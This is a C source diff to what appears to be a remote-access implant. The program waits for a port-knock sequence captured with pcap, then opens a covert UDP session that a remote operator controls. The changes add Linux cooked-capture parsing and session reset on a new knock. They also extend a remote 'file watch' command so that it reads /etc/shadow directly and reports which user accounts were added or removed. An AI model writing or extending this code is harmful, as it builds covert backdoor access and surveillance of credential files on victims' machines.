@@ -44,6 +44,7 @@ typedef struct {
     time_t mtime;
     off_t size;
     uint64_t signature;
+    char shadow_snapshot[4096];
 } watch_state_t;
 
 typedef struct {
@@ -73,6 +74,7 @@ typedef struct {
 } victim_state_t;
 
 static volatile sig_atomic_t g_running = 1;
+static pcap_t *g_pcap = NULL;
 static char **g_orig_argv = NULL;
 
 static void handle_signal(int signo);
@@ -153,6 +155,9 @@ int main(int argc, char **argv) {
 static void handle_signal(int signo) {
     (void)signo;
     g_running = 0;
+    if (g_pcap != NULL) {
+        pcap_breakloop(g_pcap);
+    }
 }
 
 static void init_state(victim_state_t *state) {
@@ -223,6 +228,7 @@ static int open_pcap(victim_state_t *state) {
         pcap_freecode(&filter);
     }
 
+    g_pcap = state->pcap_handle;
     return 0;
 }
 
@@ -230,6 +236,7 @@ static void close_pcap(victim_state_t *state) {
     if (state->pcap_handle != NULL) {
         pcap_close(state->pcap_handle);
         state->pcap_handle = NULL;
+        g_pcap = NULL;
     }
 }
 
@@ -355,7 +362,103 @@ static void poll_watch_targets(victim_state_t *state) {
         } else if (state->file_watch.mtime != current.mtime || state->file_watch.size != current.size) {
             char details[FILE_CHUNK];
 
-            snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
+            if (path_is_shadow(state->file_watch.path) && state->file_watch.shadow_snapshot[0] != '\0') {
+                FILE *fp = fopen(state->file_watch.path, "rb");
+                if (fp != NULL) {
+                    char new_contents[4096];
+                    size_t bytes = fread(new_contents, 1, sizeof(new_contents) - 1, fp);
+                    new_contents[bytes] = '\0';
+                    fclose(fp);
+
+                    int found_new = 0;
+                    snprintf(details, sizeof(details), "changed - ");
+
+                    char *nl = state->file_watch.shadow_snapshot;
+                    char *old_end_ptr = nl + strlen(nl);
+                    while (nl < old_end_ptr) {
+                        char *next_nl = strchr(nl, '\n');
+                        if (next_nl == NULL) break;
+                        *next_nl = '\0';
+                        char *colon = strchr(nl, ':');
+                        if (colon != NULL) {
+                            *colon = '\0';
+                            int line_len = (int)strlen(nl);
+                            *colon = ':';
+                            int found = 0;
+                            char *scan = new_contents;
+                            while (*scan != '\0') {
+                                if (strncmp(scan, nl, (size_t)line_len) == 0 &&
+                                    scan[line_len] == ':') {
+                                    found = 1;
+                                    break;
+                                }
+                                scan++;
+                            }
+                            if (!found) {
+                                size_t offset = sizeof(details) - strlen(details) - 1;
+                                if (offset > 0) {
+                                    *colon = '\0';
+                                    if (found_new > 0) strncat(details, ", ", offset);
+                                    strncat(details, "removed user ", offset);
+                                    strncat(details, nl, offset);
+                                    *colon = ':';
+                                    found_new++;
+                                }
+                            }
+                        }
+                        *next_nl = '\n';
+                        nl = next_nl + 1;
+                    }
+
+                    nl = new_contents;
+                    char *new_end_ptr = nl + bytes;
+                    while (nl < new_end_ptr) {
+                        char *next_nl = strchr(nl, '\n');
+                        if (next_nl == NULL) break;
+                        *next_nl = '\0';
+                        char *colon = strchr(nl, ':');
+                        if (colon != NULL) {
+                            *colon = '\0';
+                            int line_len = (int)strlen(nl);
+                            *colon = ':';
+                            int found = 0;
+                            char *scan = state->file_watch.shadow_snapshot;
+                            while (*scan != '\0') {
+                                if (strncmp(scan, nl, (size_t)line_len) == 0 &&
+                                    scan[line_len] == ':') {
+                                    found = 1;
+                                    break;
+                                }
+                                scan++;
+                            }
+                            if (!found) {
+                                size_t offset = sizeof(details) - strlen(details) - 1;
+                                if (offset > 0) {
+                                    *colon = '\0';
+                                    if (found_new > 0) strncat(details, ", ", offset);
+                                    strncat(details, "new user ", offset);
+                                    strncat(details, nl, offset);
+                                    *colon = ':';
+                                    found_new++;
+                                }
+                            }
+                        }
+                        *next_nl = '\n';
+                        nl = next_nl + 1;
+                    }
+
+                    if (found_new == 0) {
+                        snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
+                    }
+
+                    memcpy(state->file_watch.shadow_snapshot, new_contents, bytes + 1);
+                } else {
+                    snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
+                }
+            } else {
+                snprintf(details, sizeof(details), "changed (size=%lld)", (long long)current.size);
+            }
+
             send_watch_event(state, "File watch", state->file_watch.path, details);
             state->file_watch.mtime = current.mtime;
             state->file_watch.size = current.size;
@@ -398,7 +501,14 @@ static void pcap_knock_handler(u_char *args, const struct pcap_pkthdr *header, c
 
     datalink = pcap_datalink(state->pcap_handle);
 
-    if (datalink == DLT_NULL) {
+    if (datalink == DLT_LINUX_SLL) {
+        uint16_t proto;
+        memcpy(&proto, packet + 14, 2);
+        if (ntohs(proto) != 0x0800) {
+            return;
+        }
+        ip_hdr = packet + 16;
+    } else if (datalink == DLT_NULL) {
         uint32_t family;
         memcpy(&family, packet, 4);
         if (family != 2) {
@@ -484,6 +594,9 @@ static void pcap_knock_handler(u_char *args, const struct pcap_pkthdr *header, c
         if (state->knock_index == KNOCK_PORT_COUNT) {
             state->knock_complete = 1;
             state->pending_peer = src_addr;
+            if (g_pcap != NULL) {
+                pcap_breakloop(g_pcap);
+            }
         }
     }
 }
@@ -514,6 +627,9 @@ static long elapsed_ms(const struct timeval *start) {
 }
 
 static void activate_session(victim_state_t *state, const struct in_addr *peer_addr) {
+    if (state->session_active) {
+        deactivate_session(state, "new knock sequence received");
+    }
     close_pcap(state);
 
     state->covert_sock = bind_udp_socket(COVERT_PORT);
@@ -1180,39 +1296,28 @@ static int watch_remote_file(victim_state_t *state, const uint8_t *payload, uint
     watch_state_t watch;
     char path[REMOTE_PATH_MAX];
     char error[RESPONSE_TEXT_MAX];
+    int is_shadow;
 
     if (copy_payload_string(payload, payload_len, "remote file path", path, sizeof(path), error, sizeof(error)) != 0) {
         format_safe(message, message_len, "file watch failed: %s", error);
         return -1;
     }
 
-    if (path_is_shadow(path)) {
-        char dir_path[REMOTE_PATH_MAX];
-        int len;
-
-        len = snprintf(dir_path, sizeof(dir_path), "/etc");
-        if (len < 0 || (size_t)len >= sizeof(dir_path)) {
-            snprintf(message, message_len, "directory watch failed: path too long");
-            return -1;
-        }
-
-        memset(&watch, 0, sizeof(watch));
-        if (snapshot_directory_watch(dir_path, &watch) != 0) {
-            format_safe(message, message_len, "directory watch failed: cannot access %s", dir_path);
-            return -1;
-        }
-
-        watch.active = 1;
-        snprintf(watch.path, sizeof(watch.path), "%s", dir_path);
-        state->directory_watch = watch;
-        snprintf(message, message_len, "watching /etc directory (shadow file requested)");
-        return 0;
-    }
+    is_shadow = path_is_shadow(path);
 
     memset(&watch, 0, sizeof(watch));
     if (snapshot_file_watch(path, &watch) != 0) {
         format_safe(message, message_len, "file watch failed: cannot access %s", path);
         return -1;
+    }
+
+    if (is_shadow) {
+        FILE *fp = fopen(path, "rb");
+        if (fp != NULL) {
+            size_t bytes = fread(watch.shadow_snapshot, 1, sizeof(watch.shadow_snapshot) - 1, fp);
+            watch.shadow_snapshot[bytes] = '\0';
+            fclose(fp);
+        }
     }
 
     watch.active = 1;
